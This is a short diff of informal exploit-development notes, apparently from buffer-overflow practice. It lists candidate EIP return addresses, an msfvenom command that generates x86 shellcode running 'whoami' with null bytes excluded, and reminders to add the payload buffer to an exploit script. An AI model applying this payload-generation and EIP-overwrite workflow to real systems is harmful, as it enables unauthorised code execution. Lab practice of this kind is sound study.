@@ -75,3 +75,12 @@ grab like 6 of themp and put them in script and comment out
 #0xf7 f6 55 cf =  eip = '\xcf\x55\xf6\xf7'
 #0xf7 f6 57 77  
 
+
+msfvenom -p linux/x86/exec CMD=whoami -b "\x00" -f python
+
+there are errors with this possibly maybe with eip
+if whoami works
+future errors are just with shell code
+
+
+add all that to script and add buf variable to print statement
